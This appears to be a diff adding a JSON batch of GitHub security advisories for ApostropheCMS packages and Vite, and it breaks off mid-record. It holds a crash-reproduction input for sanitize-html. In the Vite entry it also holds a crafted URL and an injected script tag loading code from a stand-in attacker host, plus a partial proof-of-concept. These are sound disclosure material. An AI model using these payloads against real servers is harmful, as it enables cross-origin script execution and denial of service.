+          "name": "apostrophe"
+        },
+        "vulnerable_version_range": "< 4.34.0",
+        "first_patched_version": "4.34.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+        "score": 5.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "saiharsha0546-dot",
+          "id": 228060603,
+          "node_id": "U_kgDODZftuw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/228060603?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/saiharsha0546-dot",
+          "html_url": "https://github.com/saiharsha0546-dot",
+          "followers_url": "https://api.github.com/users/saiharsha0546-dot/followers",
+          "following_url": "https://api.github.com/users/saiharsha0546-dot/following{/other_user}",
+          "gists_url": "https://api.github.com/users/saiharsha0546-dot/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/saiharsha0546-dot/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/saiharsha0546-dot/subscriptions",
+          "organizations_url": "https://api.github.com/users/saiharsha0546-dot/orgs",
+          "repos_url": "https://api.github.com/users/saiharsha0546-dot/repos",
+          "events_url": "https://api.github.com/users/saiharsha0546-dot/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/saiharsha0546-dot/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+      "score": 5.4
+    }
+  },
+  {
+    "ghsa_id": "GHSA-c9rx-x947-fp3h",
+    "cve_id": "CVE-2026-113650",
+    "url": "https://api.github.com/advisories/GHSA-c9rx-x947-fp3h",
+    "html_url": "https://github.com/advisories/GHSA-c9rx-x947-fp3h",
+    "summary": "ApostropheCMS sanitize-html: unbounded recursion when re-sanitizing the fallback of a discarded iframe (stack overflow, nestingLimit not enforced)",
+    "description": "### Summary\n\nSince 2.18.0, when an `<iframe>` is not allowed and `disallowedTagsMode` is `'discard'` (the defaults),\nits raw-text content is re-sanitized by a recursive call to `sanitizeHtml(text, options)` (the change\nfrom #5564, fixing #5550). The recursion has no bound and starts each nested call with a fresh state.\nTwo consequences, both absent from 2.17.7 and 2.17.4:\n\n1. A few kilobytes of unclosed `<iframe>` tags throw `RangeError: Maximum call stack size exceeded`\n   with the default options. Any application that sanitizes untrusted HTML with 2.18.0 can be made to\n   throw on a small crafted input.\n2. `nestingLimit` is not enforced across a discarded iframe: each nested iframe restarts the depth\n   count at zero, so the output can be nested arbitrarily deep regardless of the configured limit.\n\n### Affected versions\n\n- 2.18.0 (the current `latest`), and the `main` branch at the time of writing (the recursive call is\n  still in `packages/sanitize-html/index.js`, in the `ontext` handler, branch\n  `tag === 'iframe' && !tagAllowed(tag) && options.disallowedTagsMode === 'discard'`).\n- Not affected: 2.17.7 and 2.17.4 (tested with the same inputs below).\n\nTested with Node.js v26.7.0.\n\n### Reproduction 1: stack overflow with the default options\n\n```js\nconst sanitizeHtml = require('sanitize-html');\n\n// with 2.18.0:\nsanitizeHtml('<iframe>'.repeat(1000));  // 8,000 chars: returns ''\nsanitizeHtml('<iframe>'.repeat(2000));  // 16,000 chars: throws RangeError: Maximum call stack size exceeded\nsanitizeHtml('<iframe>'.repeat(20000)); // 160,000 chars: throws RangeError: Maximum call stack size exceeded\n```\n\nResults:\n\n| input | 2.17.4 | 2.17.7 | 2.18.0 |\n|---|---|---|---|\n| `'<iframe>'.repeat(1000)` | ok | ok | ok |\n| `'<iframe>'.repeat(2000)` | ok | ok | RangeError |\n| `'<iframe>'.repeat(20000)` | ok | ok | RangeError |\n\nThe threshold depends on the remaining stack, so it is lower when `sanitizeHtml` is called from an\nalready deep call stack (for example inside a server-side rendering pass).\n\n### Reproduction 2: `nestingLimit` is bypassed\n\n```js\nconst sanitizeHtml = require('sanitize-html');\n\nconst input = ('<iframe>' + '<b>'.repeat(3)).repeat(50) + 'x';\nconst out = sanitizeHtml(input, { allowedTags: ['b'], nestingLimit: 3 });\n// maximum nesting depth of <b> in `out`:\n//   2.17.4: 2    2.17.7: 0 (fallback escaped as text)    2.18.0: 150\n```\n\nWithout an iframe, the same options cap the output at three nested `<b>` in all three versions. With\n`k` repetitions of `'<iframe>' + '<b>'.repeat(3)`, 2.18.0 returns `3 * k` nested `<b>` (measured for\nk = 1, 5, 50: depth 3, 15, 150).\n\n### Cause\n\nIn 2.18.0 the `ontext` handler does:\n\n```js\n} else if (\n  tag === 'iframe' &&\n  !tagAllowed(tag) &&\n  options.disallowedTagsMode === 'discard'\n) {\n  result += sanitizeHtml(text, options);\n}\n```\n\nBecause htmlparser2 treats `<iframe>` as a raw-text element, the text of an unclosed iframe is the whole\nremainder of the input; re-parsing it can meet another unclosed `<iframe>`, and so on, one stack frame\n(and one full re-parse) per iframe. The nested call also starts with its own `depth`, so tags inside the\nfallback are not counted against `nestingLimit` together with the enclosing tags.\n\n### Possible directions\n\nNot a patch, only what would close both effects: bound the recursion (or process the fallback without\nrecursing), and carry the current depth into the nested sanitization so that `nestingLimit` applies to\nthe whole output.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-c9rx-x947-fp3h",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-c9rx-x947-fp3h",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-113650",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-c9rx-x947-fp3h",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-113650",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.18.1",
+      "https://github.com/advisories/GHSA-c9rx-x947-fp3h"
+    ],
+    "published_at": "2026-10-21T17:05:01Z",
+    "updated_at": "2026-10-21T17:05:02Z",
+    "github_reviewed_at": "2026-10-21T17:05:01Z",
+    "nvd_published_at": "2026-10-20T17:17:35Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "sanitize-html"
+        },
+        "vulnerable_version_range": ">= 2.18.0, < 2.18.1",
+        "first_patched_version": "2.18.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-674",
+        "name": "Uncontrolled Recursion"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "hkmj19",
+          "id": 202265401,
+          "node_id": "U_kgDODA5TOQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/202265401?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/hkmj19",
+          "html_url": "https://github.com/hkmj19",
+          "followers_url": "https://api.github.com/users/hkmj19/followers",
+          "following_url": "https://api.github.com/users/hkmj19/following{/other_user}",
+          "gists_url": "https://api.github.com/users/hkmj19/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/hkmj19/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/hkmj19/subscriptions",
+          "organizations_url": "https://api.github.com/users/hkmj19/orgs",
+          "repos_url": "https://api.github.com/users/hkmj19/repos",
+          "events_url": "https://api.github.com/users/hkmj19/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/hkmj19/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "amikhailovstiltsoft",
+          "id": 211300477,
+          "node_id": "U_kgDODJgwfQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/211300477?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/amikhailovstiltsoft",
+          "html_url": "https://github.com/amikhailovstiltsoft",
+          "followers_url": "https://api.github.com/users/amikhailovstiltsoft/followers",
+          "following_url": "https://api.github.com/users/amikhailovstiltsoft/following{/other_user}",
+          "gists_url": "https://api.github.com/users/amikhailovstiltsoft/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/amikhailovstiltsoft/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/amikhailovstiltsoft/subscriptions",
+          "organizations_url": "https://api.github.com/users/amikhailovstiltsoft/orgs",
+          "repos_url": "https://api.github.com/users/amikhailovstiltsoft/repos",
+          "events_url": "https://api.github.com/users/amikhailovstiltsoft/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/amikhailovstiltsoft/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "score": 5.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5m22-7pfq-vp65",
+    "cve_id": "CVE-2026-113649",
+    "url": "https://api.github.com/advisories/GHSA-5m22-7pfq-vp65",
+    "html_url": "https://github.com/advisories/GHSA-5m22-7pfq-vp65",
+    "summary": "ApostropheCMS: Import API bypasses publication roles for protected content",
+    "description": "## Review scope and evidence limits\n\nPackage: @apostrophecms/import-export, version 3.7.0.\n\nRelease tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).\n\nCurrent main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.\n\nThe importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. \n\n## Import API bypasses publication roles for protected content\n\nThe import gate in canImportOrExport() checks the type's import configuration and view permission. The write helpers then call document-manager insert/update directly, including operations on published variants. We did not find the normal publish permission check or beforePublish transition in these helpers. Core permissions intentionally distinguish editRole and publishRole, and the ordinary publication lifecycle enforces that distinction.\n\nThe reported security boundary is a content type that an editor may edit but whose publication is reserved for a stronger role. Direct public-state changes through import must enforce the same publication authority. The original report describes unauthorized creation, replacement, or removal of published content under that configuration.\n\nSuggested remediation: centralize authorization for import writes; require publish permission for every non-autopublished published variant, authorize each concrete target, and preflight the complete import before persistent changes. Preserve authorized draft imports and the intended behavior of autopublished types.\n\nSource references:\n- [Import write helpers](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)\n- [Import permission gate](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/index.js)\n- [Core role distinctions](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/permission/index.js)\n- [Core insert/update/publication permission hooks](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/doc/index.js)\n\n## Coordination\n\nVivek R / Winfunc\nOriginal reporting team: Mufeed VH / Winfunc",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-5m22-7pfq-vp65",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-5m22-7pfq-vp65",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-113649",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-5m22-7pfq-vp65",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-113649",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/%40apostrophecms/import-export%403.7.1",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.1",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0",
+      "https://github.com/advisories/GHSA-5m22-7pfq-vp65"
+    ],
+    "published_at": "2026-10-21T17:03:03Z",
+    "updated_at": "2026-10-21T17:03:05Z",
+    "github_reviewed_at": "2026-10-21T17:03:03Z",
+    "nvd_published_at": "2026-10-20T17:17:35Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@apostrophecms/import-export"
+        },
+        "vulnerable_version_range": "< 3.7.1",
+        "first_patched_version": "3.7.1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "apostrophe"
+        },
+        "vulnerable_version_range": "< 4.34.0",
+        "first_patched_version": "4.34.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "score": 6.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "mufeedvh",
+          "id": 26198477,
+          "node_id": "MDQ6VXNlcjI2MTk4NDc3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/26198477?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mufeedvh",
+          "html_url": "https://github.com/mufeedvh",
+          "followers_url": "https://api.github.com/users/mufeedvh/followers",
+          "following_url": "https://api.github.com/users/mufeedvh/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mufeedvh/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mufeedvh/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mufeedvh/subscriptions",
+          "organizations_url": "https://api.github.com/users/mufeedvh/orgs",
+          "repos_url": "https://api.github.com/users/mufeedvh/repos",
+          "events_url": "https://api.github.com/users/mufeedvh/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mufeedvh/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+      "score": 6.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-jf5h-36mg-rp6x",
+    "cve_id": "CVE-2026-112956",
+    "url": "https://api.github.com/advisories/GHSA-jf5h-36mg-rp6x",
+    "html_url": "https://github.com/advisories/GHSA-jf5h-36mg-rp6x",
+    "summary": "ApostropheCMS: Archive duplicate continuation lets contributors overwrite published content",
+    "description": "## Review scope and evidence limits\n\nPackage: @apostrophecms/import-export, version 3.7.0.\n\nRelease tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).\n\nCurrent main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.\n\nThe importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.\n\n## Archive duplicate continuation permits unauthorized published-content replacement\n\nThe overrideDuplicates() continuation still accepts client-supplied replacement choices, rather than binding them to a server-maintained, user-owned duplicate analysis. The replacement and write helpers do not establish a single canonical resource identity and authorization context before the update. This leaves the reported gap between draft editing authority and the published target selected for replacement unresolved at source level.\n\nThe original report describes a contributor crossing the publication boundary through duplicate replacement on an import-enabled localized type. We have not repeated that end-to-end sequence on 3.7.0.\n\nSuggested remediation: bind continuation state to the initiating user, archive, job, permitted source/target mapping, locale and mode; reject inconsistent identity metadata; derive permissions from the actual loaded target and require publication authority for published targets.\n\nSource: overrideDuplicates(), replaceDocId(), and insertOrUpdateDoc() in the [importer](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js).\n\n## Coordination\n\nVivek R / Winfunc\nOriginal reporting team: Mufeed VH / Winfunc",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-jf5h-36mg-rp6x",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-jf5h-36mg-rp6x",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112956",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-jf5h-36mg-rp6x",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112956",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.1",
+      "https://github.com/advisories/GHSA-jf5h-36mg-rp6x"
+    ],
+    "published_at": "2026-10-21T16:59:19Z",
+    "updated_at": "2026-10-21T16:59:20Z",
+    "github_reviewed_at": "2026-10-21T16:59:19Z",
+    "nvd_published_at": "2026-10-20T16:17:06Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@apostrophecms/import-export"
+        },
+        "vulnerable_version_range": "< 3.7.1",
+        "first_patched_version": "3.7.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+        "score": 6.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-863",
+        "name": "Incorrect Authorization"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "mufeedvh",
+          "id": 26198477,
+          "node_id": "MDQ6VXNlcjI2MTk4NDc3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/26198477?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mufeedvh",
+          "html_url": "https://github.com/mufeedvh",
+          "followers_url": "https://api.github.com/users/mufeedvh/followers",
+          "following_url": "https://api.github.com/users/mufeedvh/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mufeedvh/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mufeedvh/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mufeedvh/subscriptions",
+          "organizations_url": "https://api.github.com/users/mufeedvh/orgs",
+          "repos_url": "https://api.github.com/users/mufeedvh/repos",
+          "events_url": "https://api.github.com/users/mufeedvh/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mufeedvh/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+      "score": 6.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9g7p-m758-rp72",
+    "cve_id": "CVE-2026-112955",
+    "url": "https://api.github.com/advisories/GHSA-9g7p-m758-rp72",
+    "html_url": "https://github.com/advisories/GHSA-9g7p-m758-rp72",
+    "summary": "ApostropheCMS: Import archives can exhaust server storage and deny service",
+    "description": "## Review scope and evidence limits\n\nPackage: @apostrophecms/import-export, version 3.7.0.\n\nRelease tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).\n\nCurrent main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.\n\nThe importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.\n\n## Import archive extraction lacks resource quotas and failure cleanup\n\nThe current gzip extractor handles destination write errors and waits for write completion; those parts of the original report should no longer be treated as unchanged. The import routes also now require a logged-in user before big-upload processing, as covered by GHSA-86wm-68pq-5jwq.\n\nHowever, extract() still writes expanded archive entries without per-entry, aggregate decompressed-byte, or entry-count quotas. Archive parsing still precedes document-type authorization. If extraction or parsing fails, import() notifies and rethrows before the later storage.remove() call, with no unconditional cleanup around that lifecycle. The reported residual risk is excessive storage consumption and retained extraction/staging artifacts from authenticated imports. Handling a write error and requiring login do not enforce a storage budget.\n\nSuggested remediation: add configurable streaming quotas based on actual decompressed bytes, cap entries and allowed entry types, bound concurrent imports, and clean local and uploadfs artifacts on every failure. Retain continuation artifacts only under explicit ownership, expiry and total-storage limits.\n\nSource references:\n- [Gzip extractor](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/formats/gzip.js)\n- [Import lifecycle and cleanup](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)\n- [Related authentication fix](https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-86wm-68pq-5jwq)\n\n## Coordination\n\nVivek R / Winfunc\nOriginal reporting team: Mufeed VH / Winfunc",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-9g7p-m758-rp72",
+    "source_code_location": "https://github.com/apostrophecms/apostrophe",
+    "identifiers": [
+      {
+        "value": "GHSA-9g7p-m758-rp72",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-112955",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9g7p-m758-rp72",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-112955",
+      "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+      "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+      "https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.1",
+      "https://github.com/advisories/GHSA-9g7p-m758-rp72"
+    ],
+    "published_at": "2026-10-21T16:57:36Z",
+    "updated_at": "2026-10-21T16:57:38Z",
+    "github_reviewed_at": "2026-10-21T16:57:36Z",
+    "nvd_published_at": "2026-10-20T16:17:06Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@apostrophecms/import-export"
+        },
+        "vulnerable_version_range": "< 3.7.1",
+        "first_patched_version": "3.7.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+        "score": 6.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "mufeedvh",
+          "id": 26198477,
+          "node_id": "MDQ6VXNlcjI2MTk4NDc3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/26198477?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mufeedvh",
+          "html_url": "https://github.com/mufeedvh",
+          "followers_url": "https://api.github.com/users/mufeedvh/followers",
+          "following_url": "https://api.github.com/users/mufeedvh/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mufeedvh/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mufeedvh/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mufeedvh/subscriptions",
+          "organizations_url": "https://api.github.com/users/mufeedvh/orgs",
+          "repos_url": "https://api.github.com/users/mufeedvh/repos",
+          "events_url": "https://api.github.com/users/mufeedvh/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mufeedvh/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "score": 6.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9jrq-w75r-8gcw",
+    "cve_id": "CVE-2026-112945",
+    "url": "https://api.github.com/advisories/GHSA-9jrq-w75r-8gcw",
+    "html_url": "https://github.com/advisories/GHSA-9jrq-w75r-8gcw",
+    "summary": "Vite: Cross origin script execution through Vite custom middleware",
+    "description": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n<script type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy&index=0.js\"></script>\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '<script type=\"module\">document.body.textContent = \"Vite app\"</script>'\n\nconst listen = (server, port = 0) =>\n  new Promise((resolve, reject) => {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () => {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =>\n  new Promise((resolve, reject) => {\n    server.close((error) => (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) => {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await 